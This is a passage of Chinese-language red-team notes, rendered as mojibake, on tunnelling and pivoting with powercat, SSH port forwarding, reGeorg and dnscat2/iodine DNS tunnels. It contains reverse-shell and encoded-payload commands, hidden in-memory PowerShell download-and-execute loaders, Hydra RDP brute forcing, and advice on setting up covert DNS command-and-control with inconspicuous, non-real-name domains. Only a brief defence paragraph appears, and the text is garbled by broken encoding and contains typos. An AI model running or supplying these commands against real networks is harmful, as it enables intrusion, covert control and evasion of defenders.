æœåŠ¡ç«¯å‡†å¤‡æ¥æ”¶æ–‡ä»¶ powercat -l -p 9999 -of test.txt -v # -of è¾“å‡ºæ–‡ä»¶å powercat -c 10.10.10.129 -p 9999 -i c:\1.txt -v # -i è¾“å…¥ï¼šå¯å†™æ–‡ä»¶åï¼Œä¹Ÿå¯ç›´æ¥å†™å­—ç¬¦ä¸² ç”¨powercatç”Ÿæˆpayload # æœ‰æ­£å‘ã€åå‘ï¼Œä¸”å¯ä»¥è¿›è¡Œç¼–ç  ## # å®¢æˆ·ç«¯ç”Ÿæˆ powercat -l -p 8888 -e cme -v -g >>shell.ps1 # ç”Ÿæˆåå¼¹shellçš„è„šæœ¬ #æˆ–è€…ç”Ÿæˆåå¼¹powershellçš„è„šæœ¬ powercat -l -p 7777 -ep -v -g >>shell2.ps1 # æŠŠç”Ÿæˆçš„æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡å¹¶è¿è¡Œ # ç„¶ååœ¨å®¢æˆ·ç«¯æ‰§è¡Œ powercat -c 10.10.10.129 -p 8888 -v # å°±ä¼šè·å¾—ä¸€ä¸ªåå¼¹shell ## ä¹Ÿå¯ç”Ÿæˆç¼–ç çš„payload # å®¢æˆ·ç«¯è¿è¡Œ powercat -c 10.10.10.129 -p 6666 -ep -ge # -ge ç”Ÿæˆç»è¿‡ç¼–ç çš„payload # ç›®æ ‡è¿è¡Œ powershell -E "ä¸Šé¢çš„ç¼–ç " # ç»§ç»­å®¢æˆ·ç«¯æ‰§è¡Œ powercat -l -p 9999 -v PowerCat DNSéš§é“é€šä¿¡ # ç”±äºå…¶dnséš§é“æ˜¯åŸºäºdnscatè®¾è®¡çš„ï¼Œæ‰€ä»¥å…ˆä¸‹è½½å®‰è£…ç¼–è¯‘å®ƒ(æ”¾åœ¨ç›®æ ‡æœºå™¨Linux) # ä¸‹è½½åœ°å€ï¼šhttps://github.com/iagox86/dnscat2 git clone https://github.com/iagox86/dnscat2 cd dnscat2/server/ gem install bundler bundle install # ç„¶åï¼Œç›®æ ‡æœºå™¨æ‰§è¡Œ ruby dnscat2.rb ttpowercat.test -e open --no-cache # å›åˆ°æˆ‘ä»¬çš„æœºå™¨ï¼Œæ‰§è¡Œ powercat -c 192.168.56.129 -p 53 -dns ttpowercat.tect -e cmd.exe # -dnsè¡¨ç¤ºä½¿ç”¨dnsè¿›è¡Œé€šä¿¡ # ç„¶åå°±èƒ½çœ‹åˆ°åå¼¹å›æ¥çš„shelläº† å°†powercatä½œä¸ºè·³æ¿ # æƒ…æ™¯ï¼švpså¯è®¿é—®win7,ä½†ä¸èƒ½è®¿é—®win server08 win7å¯è®¿é—®win server08 # ä»¥win7ä¸ºè·³æ¿ï¼Œæ¥å®ç°vpså¯¹win server08çš„è®¿é—® ### F1 #1.åœ¨win server08æ‰§è¡Œ powercat -l -v -p 9999 -e cmd.exe #2.åœ¨win7(è·³æ¿)æ‰§è¡Œ powercat -l -v -p 8000 -r tcp:10.10.10.129:9999 #3.vpsä¸Šï¼Œè¿æ¥win7 nc 192.168.56.130 8000 -vv # è¿æ¥æˆåŠŸ ### F2. ä½¿ç”¨DNSåè®® #1. win7ä¸Š powercat -l -p 8000 -r dns:192.168.56.129::ttpowercat.test # æŒ‡å®švpsçš„åœ°å€ #2. vpsä¸Šæ‰§è¡Œï¼Œå¯åŠ¨dnscat ruby dnscat2.rb ttpowercat.test -e open --no-cache #3. win server08(ç›®æ ‡æœºå™¨) powercat -c 10.10.10.128 -p 8000 -v -e cmd.exe # å°±å¯ä»¥çœ‹åˆ°åå¼¹shelläº† powercatæ›´å¤šç”¨æ³• â€‹```bash # https://github.com/besimorhino/powercat åº”ç”¨å±‚éš§é“æŠ€æœ¯ ä½¿ç”¨è¾ƒå¤š 1.SSHéš§é“å‚æ•° -C # å‹ç¼©ä¼ è¾“(æé«˜ä¼ è¾“é€Ÿåº¦) -f # åå°æ‰§è¡Œ -N # é™é»˜è¿æ¥(å»ºç«‹äº†é“¾æ¥ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“ä¼šè¯) -g # å…è®¸è¿œç¨‹ä¸»æœºé“¾æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ -L # æœ¬åœ°ç«¯å£è½¬å‘ -R # è¿œç¨‹ç«¯å£è½¬å‘ -D # åŠ¨æ€è½¬å‘(SOCKSä»£ç†) -P # æŒ‡å®šSSHç«¯å£ SSHé…ç½®æ–‡ä»¶ # vim /etc/ssh/sshd_config AllowTcpForwarding yes # å…è®¸è½¬å‘TCPåè®® GatewayPorts yes # æ˜¯å¦å…è®¸é€»è¾‘ä¸»æœºæœ¬åœ°è½¬å‘ç«¯å£ PermitRootLogin yes #å…è®¸rootç™»å½• PasseordAuthentication yes # å…è®¸ä½¿ç”¨åŸºäºå¯†ç çš„è®¤è¯ TCPKeepAlive yes # é˜»æ­¢sshæ–­å¼€ # ç„¶åé‡å¯sshæœåŠ¡ æœ¬åœ°è½¬å‘ # æƒ…æ™¯ï¼švpsèƒ½è®¿é—®webæœåŠ¡å™¨ï¼Œvpsä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼ŒwebæœåŠ¡å™¨èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨(éœ€è¦ä»¥webæœåŠ¡å™¨ä¸ºè·³æ¿) # vpsä¸Šæ‰§è¡Œ ssh -CfNg -L 1153(vpsç«¯å£):1.1.1.10(ç›®æ ‡):3389(ç›®æ ‡ç«¯å£) root@192.168.1.11(è·³æ¿æœº) # è¾“å…¥è·³æ¿æœºå™¨çš„å¯†ç  # å«ä¹‰ï¼šå°†å¯¹æ–¹çš„3389ç«¯å£æ˜ å°„åˆ°æœ¬åœ°vpsçš„1153ä¸Š etstat -antlup |grep "1153" # æŸ¥çœ‹æœ¬åœ°ç«¯å£æ­£åœ¨ç›‘å¬ # è¿æ¥æœ¬åœ°çš„1153ï¼Œå°±å¯ä»¥é“¾æ¥å¯¹é¢çš„è¿œç¨‹é“¾æ¥äº† rdesktop 127.0.0.1:1153 # å…¶å®å°±æ˜¯ä¸€ä¸ªæ­£å‘çš„tcpè¿æ¥ è¿œç¨‹è½¬å‘ # WebæœåŠ¡å™¨(è·³æ¿æœºå™¨)æ‰§è¡Œ ssh -CfNg -R 3307(vpsç«¯å£):1.1.1.10(ç›®æ ‡ip):3389(ç›®æ ‡ç«¯å£) root@192.168.1.4(vpsåœ°å€) # å°†ç›®æ ‡çš„3389ç«¯å£æ˜ å°„åˆ°è¿œç¨‹vpsçš„3307ä¸Š # è¿æ¥vpsçš„3307ï¼Œå°±å¯ä»¥é“¾æ¥å¯¹é¢çš„è¿œç¨‹é“¾æ¥äº† åŠ¨æ€è½¬å‘ # åŠ¨æ€ç«¯å£æ˜ å°„å°±å»ºç«‹ä¸€ä¸ªSSHåŠ å¯†çš„SOCKS 4/5ä»£ç†é€šé“ï¼Œä»»ä½•æ”¯æŒSOCKS 4/5çš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ å¯†é€šé“è¿›è¡Œä»£ç†è®¿é—® #1. vpsä¸Šæ‰§è¡Œ ssh -CfNg -D 7000(vpsç«¯å£) root@192.168.1.11(è·³æ¿æœºå™¨åœ°å€) #2. æµè§ˆå™¨è®¾ç½®ç½‘ç»œä»£ç†Socks 127.0.0.1:7000ã€‚é€šè¿‡æµè§ˆå™¨è®¿é—®å†…ç½‘çš„æœºå™¨1.1.1.2çš„webèµ„æº ... ... é˜²å¾¡æ€è·¯ åœ¨ç³»ç»Ÿä¸­é…ç½®SSHè¿œç¨‹ç®¡ç†ç™½åå• åœ¨ACLä¸­é™åˆ¶åªæœ‰ç‰¹å®šçš„IPåœ°å€æ‰èƒ½è¿æ¥SSH ä»¥åŠè®¾ç½®ç³»ç»Ÿå®Œå…¨ä½¿ç”¨å¸¦å¤–ç®¡ç†ç­‰æ–¹æ³• å¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„èµ„æºå»ºç«‹å¸¦å¤–ç®¡ç†çš„ç½‘ç»œç»“æ„ï¼Œåœ¨å†…ç½‘ä¸­è‡³å°‘è¦é™åˆ¶SSHè¿œç¨‹ç™»å½•çš„åœ°å€å’ŒåŒå‘è®¿é—®ç­–ç•¥(ä»å¤–éƒ¨åˆ°å†…éƒ¨:ä»å†…éƒ¨åˆ°å¤–éƒ¨) 2.HTTP/HTTPSéš§é“å¸¸ç”¨å·¥å…·ï¼š reGeorg(reDuh)çš„å‡çº§ç‰ˆï¼ŒæŠŠå†…ç½‘æœåŠ¡å™¨ç«¯å£çš„æ•°æ®é€šè¿‡HTTP/HTTPSéš§é“è½¬å‘åˆ°æœ¬æœºã€‚æµé‡ç‰¹å¾æ˜æ˜¾ï¼Œå®¹æ˜“è¢«æ€è½¯æŸ¥æ€ ä¸‹è½½åœ°å€ meterpreter tunna(ä¸‹è½½åœ°å€) ç­‰ç­‰ reGeorg å·¥å…·æ”¯æŒå¾ˆå¤šç§è„šæœ¬ #1.å…ˆæŠŠè„šæœ¬æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸­ï¼Œç„¶åè¿œç¨‹è®¿é—®å†…ç½‘ç½‘ç«™çš„æŸè„šæœ¬æ–‡ä»¶ #2.åœ¨vpsä¸Šä½¿ç”¨reGeorgSocksProxy.py è„šæœ¬æ¥è¿æ¥ python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999 # æœ¬æœº9999ç«¯å£å·²ç»å¼€å§‹ç›‘å¬äº† #3.é…ç½®ProxyChainsï¼Œè®¾ç½®å…¨å±€ä»£ç† vim /etc/proxychains.conf dynamic_chain socks4 127.0.0.1 9999 # è®¾ç½®ä»£ç†ç«¯å£ #4.æµ‹è¯•ä»£ç†æ˜¯å¦æ­£å¸¸ proxyesolv www.baidu.com #5.ä½¿ç”¨proxychainsæ‰“å¼€åº”(é€šè¿‡éš§é“è¿›è¡Œé€šä¿¡) proxychains firefox #6.å°±å¯ä»¥ä½¿ç”¨Hydraè¿›è¡Œæš´åŠ›ç ´è§£rdp(ä½¿ç”¨httpéš§é“ï¼Œä¸ä¼šå¤ªæ˜æ˜¾) hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt Hydra æš´åŠ›ç ´è§£å¯†ç (æ”¯æŒå¾ˆå¤šåè®®) -R # æ ¹æ®ä¸Šä¸€æ¬¡è¿›åº¦ç»§ç»­ç ´è§£ -S # ä½¿ç”¨SSLåè®®è¿æ¥ -s # æŒ‡å®šç«¯å£ -l # æŒ‡å®šç”¨æˆ·å -L # æŒ‡å®šç”¨æˆ·åå­—å…¸(æ–‡ä»¶) -p # æŒ‡å®šå¯†ç ç ´è§£ -P # åˆ¶å®šå¯†ç å­—å…¸(æ–‡ä»¶) -t # æŒ‡å®šå¤šçº¿ç¨‹æ•°é‡ï¼Œé»˜è®¤ä¸º16ä¸ªçº¿ç¨‹ -vV # æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ 3.DNSåè®®(é‡ç‚¹)è™½ç„¶æ¿€å¢çš„DNSæµé‡å¯èƒ½ä¼šè¢«å‘ç°ï¼Œä½†åŸºäºä¼ ç»Ÿçš„Socketéš§é“å·²ç»æ¿’ä¸´æ·˜æ±°ä»¥åŠTCPã€UDPé€šä¿¡å¤§é‡è¢«é˜²å¾¡ç³»ç»Ÿæ‹¦æˆªçš„çŠ¶å†µï¼ŒDNSã€ICMPã€HTTP/HTTPSç­‰éš¾ä»¥è¢«ç¦ç”¨çš„åè®®å·²ç»æˆä¸ºiæ”»å‡»è€…æ§åˆ¶éš§é“çš„ä¸»è¦æ¸ é“DNSæ˜¯ä¸€ä¸ªä¸å¯ç¼ºå°‘çš„æœåŠ¡ï¼›å¦ä¸€ä¸ªæ–¹é¢ï¼ŒDNSæŠ¥æ–‡å…·æœ‰ç©¿é€é˜²ç«å¢™çš„èƒ½åŠ›ï¼›ä¹Ÿç”±äºé˜²ç«å¢™å’ŒIDSç­‰å¤§éƒ½ä¸ä¼šè¿‡æ»¤DNSæµé‡ï¼Œä¹Ÿä¸ºDNSæˆä¸ºéšè”½ä¿¡é“åˆ›é€ äº†æ¡ä»¶ C&amp;C(Command and Control Server, å‘½ä»¤æ§åˆ¶æœåŠ¡å™¨) â€“ ç”¨æ¥ç®¡ç†åƒµå°¸ç½‘ç»œå’Œè¿›è¡ŒAPTæ”»å‡»çš„æœåŠ¡å™¨åˆ†ä¸ºï¼šC&amp;CæœåŠ¡ç«¯ï¼ŒC&amp;Cå®¢æˆ·ç«¯ç”±äºå®‰å…¨å‚å•†å„ç§æªæ–½é˜»æ–­äº†C&amp;Cé€šä¿¡ï¼Œé€šè¿‡å„ç§éš§é“æŠ€æœ¯å®ç°C&amp;Cé€šä¿¡çš„æŠ€æœ¯(ç‰¹åˆ«æ˜¯DNSéš§é“æŠ€æœ¯)å‡ºç°äº† DNSéš§é“åŸç†ï¼š DNSæŸ¥è¯¢çš„åŸŸåä¸å­˜åœ¨ï¼Œä¼šå»å¤–ç½‘DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚å¦‚æœäº’è”ç½‘ä¸Šæœ‰ä¸€å°å®šåˆ¶çš„æœåŠ¡å™¨ï¼Œä¾é DNSåè®®å³å¯è¿›è¡Œæ•°æ®åŒ…çš„äº¤æ¢ã€‚ åœ¨ä½¿ç”¨DNSéš§é“ä¸å¤–éƒ¨è¿›è¡Œé€šä¿¡æ—¶ï¼Œä»è¡¨é¢çœ‹æ˜¯æ²¡æœ‰è¿æ¥å¤–ç½‘çš„(å†…ç½‘ç½‘å…³æ²¡æœ‰è¿›è¡Œè½¬å‘æ•°æ®åŒ…)ï¼Œä½†å®é™…ä¸Šï¼Œå†…ç½‘çš„DNSæœåŠ¡å™¨è¿›è¡Œäº†ä¸­ä¸“æ“ä½œã€‚ å°±æ˜¯å°†å…¶ä»–åè®®å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œä¼ è¾“ã€‚ æŸ¥çœ‹DNSçš„è”é€šæ€§ # æŸ¥è¯¢å½“å‰å†…éƒ¨åŸŸåå’ŒIPåœ°å€ cat /etc/resolve.conf |grep -v '#' # æŸ¥çœ‹èƒ½å¦ä¸å†…éƒ¨DNSé€šä¿¡æ„å‘³ç€å¯ä»¥ä½¿ç”¨DNSéš§é“ nslookup hacker.testlab # æŸ¥çœ‹èƒ½å¦é€šè¿‡DNSæœåŠ¡å™¨è§£æå¤–éƒ¨åŸŸå(å¦‚æœå¯ä»¥ï¼Œå°±æ„å‘³ç€å¯ä»¥ä½¿ç”¨DNSéš§é“å®ç°éšè”½é€šä¿¡) nslookup baidu.com 1).dnscat2å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/iagox86/dnscat2https://downloads.skullsecurity.org/dnscat2/https://github.com/lukebaggett/dnscat2-powershell ä½¿ç”¨DNSåè®®åˆ›å»ºåŠ å¯†çš„C&amp;Cé€šé“é€šè¿‡é¢„å…±äº«å¯†é’¥è¿›è¡Œèº«ä»½éªŒè¯ä½¿ç”¨ShellåŠDNSæŸ¥è¯¢ç±»å‹(TXT, MX, CNAME, A, AAAA)ï¼Œå¤šä¸ªåŒæ—¶è¿›è¡Œçš„ä¼šè¯ç±»ä¼¼ä¸SSHä¸­çš„éš§é“ å®¢æˆ·ç«¯æ˜¯ç”¨Cå†™çš„ï¼ŒæœåŠ¡ç«¯æ˜¯ç”¨Rubyå†™çš„ dnscat2çš„éš§é“æœ‰ä¸¤ç§æ¨¡å¼ï¼š - ç›´è¿æ¨¡å¼ï¼šå®¢æˆ·ç«¯ç›´æ¥å‘æŒ‡å®šIPåœ°å€çš„NDSæœåŠ¡å™¨å‘èµ·DNSè§£æè¯·æ±‚ - ä¸­ç»§æ¨¡å¼ï¼šDNSç»è¿‡äº’è”ç½‘çš„è¿­ä»£è§£æï¼ŒæŒ‡å‘æŒ‡å®šçš„DNSæœåŠ¡å™¨(é€Ÿåº¦è¾ƒæ…¢) å¦‚æœç›®æ ‡å†…ç½‘æ”¾è¡Œæ‰€æœ‰çš„DNSè¯·æ±‚ï¼Œdnscat2ä¼šä½¿ç”¨ç›´è¿æ¨¡å¼ï¼Œé€šè¿‡UDPçš„53ç«¯å£è¿›è¡Œé€šä¿¡(ä¸éœ€è¦åŸŸåï¼Œé€Ÿåº¦å¿«ï¼Œè€Œä¸”çœ‹ä¸Šå»ä»ç„¶åƒæ™®é€šçš„DNSæŸ¥è¯¢)ã€‚åœ¨è¯·æ±‚æ—¥å¿—ä¸­ï¼Œæ‰€æœ‰çš„åŸŸåéƒ½æ˜¯ä»¥dnscatå¼€å¤´çš„ï¼Œå› æ­¤é€šä¿¡å®¹æ˜“æ£€æµ‹ã€‚ å¦‚æœç›®æ ‡å†…ç½‘ä¸­è¯·æ±‚ä»…é™äºç™½åå•æœåŠ¡å™¨æˆ–ç‰¹å®šçš„åŸŸï¼Œdnscat2ä¼šä½¿ç”¨ä¸­ç»§æ¨¡å¼æ¥ç”³è¯·ä¸€ä¸ªåŸŸåï¼Œå¹¶å°†è¿è¡Œdnscat2è¯»æ— ç«¯çš„æœåŠ¡å™¨æŒ‡å®šä¸ºå—ä¿¡ä»»çš„DNSæœåŠ¡å™¨ DNSéš§é“åº”ç”¨åœºæ™¯ï¼š åœ¨å®‰å…¨ç­–ç•¥ä¸¥æ ¼çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œåªå…è®¸ç™½åå•æµé‡å‡ºç«™ï¼ŒåŒæ—¶å…¶ä»–ç«¯å£éƒ½è¢«å±è”½ï¼Œä¼ ç»Ÿçš„C&amp;Cé€šä¿¡æ— ç¢å»ºç«‹ï¼Œè¿™æ—¶å€™Red Teamè¿˜æœ‰ä¸€ä¸ªé€‰æ‹©ï¼šä½¿ç”¨DNSéšè”½éš§é“å»ºç«‹é€šä¿¡ dnscat2ç‰¹ç‚¹ï¼š - æ”¯æŒå¤šä¸ªä¼šè¯ - æµé‡åŠ å¯† - ä½¿ç”¨å¯†é’¥æ–¹å¼MiTMæ”»å‡» - åœ¨å†…å­˜ä¸­ç›´æ¥è¿è¡ŒPowershellè„šæœ¬ - éšè”½é€šä¿¡ ä½¿ç”¨1.éƒ¨ç½²åŸŸåè§£æ # vps(Linux)ä½œä¸ºC&amp;CæœåŠ¡ç«¯ï¼Œå¹¶éœ€è¦ä¸€ä¸ªåŸŸå(godaddyç½‘ç«™ã€‚é€‰æ‹©ä¸æ˜¾çœ¼çš„åŸŸåï¼Œé€‰æ‹©ä¸å®åçš„ï¼Œå›½å¤–çš„ï¼Œå°½é‡çŸ­) 1.åˆ›å»ºAè®°å½•ï¼ŒæŠŠè‡ªå·±çš„åŸŸåè§£ææœåŠ¡å™¨æŒ‡å‘vpsçš„ip(è¿™é‡Œå‡è®¾èµ·åå­—ns1.360bobao.xyz) 2.åˆ›å»ºNSè®°å½•ï¼Œå°†dnschå­åŸŸåçš„è§£æç»“æœæŒ‡å‘Aè®°å½•(åç§°ä¸ºvpnæŒ‡å‘ns1.360bobao.xyz) # æ£€æµ‹Aç±»è§£æå’ŒNSè§£ææ˜¯å¦æˆåŠŸ åœ¨vpsä¸ŠæŠ“åŒ…ï¼š tcpdump -n -i eth0 udp dst port 53 è§£ææµ‹è¯•(nslookupæˆ–dig)ï¼š nslookup xxxxx.xxxx.xxxx #å¦‚æœèƒ½æŠ“åˆ°å¯¹ä½ åŸŸåè¿›è¡ŒæŸ¥è¯¢çš„DNSè¯·æ±‚æ•°æ®åŒ…ï¼Œå°±è¯´æ˜ç¬¬äºŒæ¡NSå°±è¯¶ç³»è®¾ç½®å·²ç»ç”Ÿæ•ˆ 2.å®‰è£…dnscat2æœåŠ¡ç«¯(åœ¨vpsä¸Š) # å…ˆé…ç½®Rubyç¯å¢ƒï¼Œkaliå†…ç½®äº†Rubyç¯å¢ƒï¼Œä½†æ˜¯è¿è¡Œæ—¶å€™å¯èƒ½ç¼ºå°‘ä¸€äº›gemä¾èµ–åŒ… # è¿™é‡Œä½¿ç”¨ubuntu server apt-get install gem apt-get install ruby-dev apt-get install libpq-dev apt-get install ruby-bundlers git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install # å¯åŠ¨æœåŠ¡ç«¯b sudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache # å¦‚æœæ˜¯é‡‡ç”¨çš„ç›´è¿æ¨¡å¼ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=553,type=TXT # ä»¥ä¸Šå‘½ä»¤è¡¨ç¤ºï¼šç›‘å¬æœ¬æœºçš„553ç«¯å£ï¼Œè‡ªå®šä¹‰è¿æ¥å¯†ç pass123456 # å‚æ•° -c # å®šä¹‰äº†"pre-shared secret",å¯ä½¿ç”¨å…·æœ‰é¢„å…±äº«å¯†é’¥çš„èº«ä»½éªŒè¯æœºåˆ¶æ¥é˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚å¦‚æœä¸æŒ‡å®šï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆéšæœºå­—ç¬¦ä¸²(è®°å½•ä¸‹æ¥ï¼Œå®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨) -e # è§„å®šå®‰å…¨çº§åˆ«ã€‚"open" è¡¨ç¤ºæœåŠ¡ç«¯å…è®¸å®¢æˆ·ç«¯ä¸è¿›è¡ŒåŠ å¯† --no-cache # ç¦æ­¢ç¼“å­˜(è¯¥å‚æ•°åŠ¡å¿…è¦æ·»åŠ ï¼Œå› ä¸ºpower-dnscat2å®¢æˆ·ç«¯ä¸dnscat2æœåŠ¡å™¨çš„Cachingæ¨¡å¼ä¸å…¼å®¹) 3.ç›®æ ‡ä¸»æœºå®‰è£…å®¢æˆ·ç«¯ # dnscat2 å®¢æˆ·ç«¯æ˜¯Cå†™çš„ï¼Œæ‰€ä»¥å…ˆç¼–è¯‘ã€‚winä¸Šå¯ä½¿ç”¨vsç¼–è¯‘ï¼›Linuxä¸­ç›´æ¥è¿è¡Œ`make install` git clone https://github.com/iagox86/dnscat2.git cd dnscat2/client make # è¿™é‡Œä½¿ç”¨çš„æ˜¯ç›´æ¥ç¼–è¯‘å¥½çš„winç³»ç»Ÿä¸Šçš„å®¢æˆ·ç«¯ï¼šhttps://downloads.skullsecurity.org/dnscat2 # æœåŠ¡ç«¯å»ºå¥½ä¹‹åï¼Œåœ¨å®¢æˆ·ç«¯è¿è¡Œæµ‹è¯•èƒ½å¦ä¸æœåŠ¡ç«¯é€šä¿¡ dnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz # åœ¨å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯ dnscat2-v0.07-client-win32.exe --dns domain=vpn.360bobao.xyz --secret pass123456 # å¦‚æœæˆåŠŸï¼Œä¼šæ˜¾ç¤º"Session established!" # å¦‚æœæœåŠ¡ç«¯ä½¿ç”¨çš„æ˜¯ç›´è¿æ¨¡å¼ï¼Œå¯ä»¥ç›´æ¥å¡«å†™æœåŠ¡ç«¯ipåœ°å€(ä¸é€šè¿‡DNSæœåŠ¡æä¾›å•†)ï¼Œå‘dnscat2æœåŠ¡ç«¯æ‰€åœ¨çš„IPå¼Ÿå­å’Œè¯·æ±‚DNSè§£æï¼Œå‘½ä»¤å¦‚ä¸‹ dnscat --dns server &lt;dnscat2_server_IP>,port=53,type=TXT --secret=pass123456 # æ¨èä½¿ç”¨Powershellç‰ˆæœ¬çš„dnscat2-powershell(ç›®æ ‡winæœºå™¨éœ€è¦æ”¯æŒpowershell2.0ä»¥ä¸Šç‰ˆæœ¬)ï¼šhttps://github.com/lukebaggett/dnscat2-powershell #ä¸‹è½½è„šæœ¬åˆ°æœ¬åœ°æ‰§è¡Œï¼š Import-Module .dnscat2.ps1 #ä¹Ÿå¯åœ¨çº¿åŠ è½½è„šæœ¬ï¼š IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1"); start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer ***.***.***.*** # ä¹Ÿå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œä½¿ç”¨IEXåŠ è½½è„šæœ¬çš„æ–¹å¼ï¼Œåœ¨å†…å­˜ä¸­æ‰“å¼€dnscat2å®¢æˆ·ç«¯ powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1");start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer ***.***.***.***} # æ‰§è¡Œå‘½ä»¤ï¼Œåˆ›å»ºæ§åˆ¶å°ï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œpowershellå‘½ä»¤å’Œè„šæœ¬ exec psh 4.åå¼¹shell # äº¤äº’shellï¼Œ å’ŒMetasploitç±»ä¼¼ # åœ¨å®¢æˆ·ç«¯è¿è¡Œdnscat2.ps1è„šæœ¬ï¼Œåœ¨æœåŠ¡ç«¯å°±èƒ½çœ‹åˆ°å®¢æˆ·ç«¯ä¸Šçº¿çš„æç¤º # å¸¸ç”¨å‘½ä»¤ï¼š windows # æŸ¥çœ‹å½“å‰çš„æ§åˆ¶è¿›ç¨‹(æ¯ä¸ªè¿æ¥éƒ½æ˜¯ç‹¬ç«‹çš„) sessions # åŒåŒä¸Š session --I 1 # è¿›å…¥æŸä¸ªé€šé“ window -i 1 exec notepad.exe # è¿œç¨‹æ‰“å¼€æŒ‡å®šç¨‹åº download # ä¸‹è½½æ–‡ä»¶(æ…¢ï¼Œå…ˆæŠŠæ‰€æœ‰æ•°æ®å…ˆå†™å…¥ç¼“å­˜ï¼Œæœ€åå†™å…¥ç¡¬ç›˜) ä¸é€‚åˆå¤§æ–‡ä»¶ upload # ä¸Šä¼ æ–‡ä»¶() clear # æ¸…å± delay # ä¿®æ”¹è¿œç¨‹å“åº”å»¶æ—¶ shell # å¾—åˆ°ä¸€ä¸ªåå¼¹shell suspend # è¿”å›ä¸Šä¸€å±‚ï¼Œç›¸å½“äºå¿«æ·é”®"ctrl+z" listen # ç±»ä¼¼SSHéš§é“çš„â€”Lå‚æ•°(æœ¬åœ°è½¬å‘)ï¼Œå¦‚ï¼šlisten 0.0.0.0:53 192.168.1.1:3389 ping # ç¡®è®¤ä¸»æœºåœ¨çº¿ï¼Œå¦‚æœè¿”å›"pong"ï¼Œåˆ™åœ¨çº¿ shutdown # åˆ‡æ–­å½“å‰ä¼šè¯ quit # æ¨å‡ºdnscat2æ§åˆ¶å° kill &lt;id> # åˆ‡æ–­é€šé“ set # è®¾ç½®å€¼ï¼Œä¾‹å¦‚ï¼šsecurity=open æ”¯æŒå¤šåŸŸåå¹¶å‘ï¼Œå¯å°†å¤šä¸ªå­åŸŸç»‘å®šåœ¨åŒä¸€ä¸ªNSä¸‹ï¼Œç„¶ååœ¨æœåŠ¡ç«¯åŒæ—¶æ¥æ”¶å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ ruby dnscat2.rb --dns=port53532 --security=open start --den domain=&lt;domain.com>,domain=&lt;domain.com> 2).iodineå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/Al1ex/iodineå®˜æ–¹æ–‡æ¡£ï¼šhttp://code.kryo.se/iodine iodineå¯ä»¥çš„é€šè¿‡ä¸€å°DNSæœåŠ¡å™¨åˆ¶é€ ä¸€ä¸ªIPv4æ•°æ®é€šé“ï¼Œç‰¹åˆ«é€‚åˆåœ¨ç›®æ ‡ä¸»æœºåªèƒ½å‘é€DNSè¯·æ±‚çš„ç½‘ç»œç¯å¢ƒä¸­ä½¿ç”¨ã€‚Cè¯­è¨€å¼€å‘ï¼Œåˆ†ä¸ºæœåŠ¡ç«¯ç¨‹åºiodinedå’Œå®¢æˆ·ç«¯ç¨‹åºiodine, Kaliå†…ç½®äº†iodine ç‰¹ç‚¹ï¼š - ä¸ä¼šå¯¹ä¸‹è¡Œæ•°æ®è¿›è¡Œç¼–ç  - æ”¯æŒå¤šå¹³å°ï¼ŒåŒ…æ‹¬Linux,BSD,Mac OS, Windows - æ”¯æŒå¼ºåˆ¶å¯†ç æœºåˆ¶ - æ”¯æŒåŒç½‘æ®µéš§é“IPåœ°å€(ä¸åŒæœåŠ¡å™¨-å®¢æˆ·ç«¯ç½‘æ®µ) - æ”¯æŒå¤šç§DNSè®°å½•ç±»å‹ - æä¾›äº†ä¸°å¯Œçš„éš§é“è´¨é‡æ£€æµ‹æªæ–½ æ”¯æŒç›´æ¥è½¬å‘å’Œä¸­ç»§ä¸¤ç§æ¨¡å¼ åŸç†ï¼šé€šè¿‡TAPè™šæ‹Ÿç½‘å¡ï¼Œåœ¨æœåŠ¡ç«¯å»ºç«‹ä¸€ä¸ªå±€åŸŸç½‘ï¼›åœ¨å®¢æˆ·ç«¯ï¼Œé€šè¿‡TAPå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼›ä¸¤è€…é€šè¿‡DNSéš§é“ç›¸è¿ï¼Œå¤„äºåŒä¸€ä¸ªå±€åŸŸç½‘(å¯pingé€š)ã€‚åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´å»ºç«‹è¿æ¥åï¼Œå®¢æˆ·æœºä¼šå¤šå‡ºä¸€å—åä¸ºâ€dns0â€çš„è™šæ‹Ÿç½‘å¡ã€‚ 